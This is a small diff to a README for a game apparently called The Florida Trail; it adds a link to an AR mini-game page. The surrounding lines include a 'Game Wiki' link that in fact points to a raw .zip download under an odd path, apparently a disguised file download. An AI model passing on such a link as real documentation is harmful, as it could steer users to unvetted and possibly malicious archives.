@@ -62,5 +62,6 @@ For questions or feedback, please contact the project maintainer at: https://raw
 
 - **Game Wiki:** [Florida Trail Wiki](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip)
 - **Follow Us on Social Media:** Stay updated with our latest news and features.
+- **AR Mini Game:** [Florida Trail AR: Critter Catch](ar-game/README.md)
 
 Thank you for choosing The Florida Trail. Enjoy your journey!
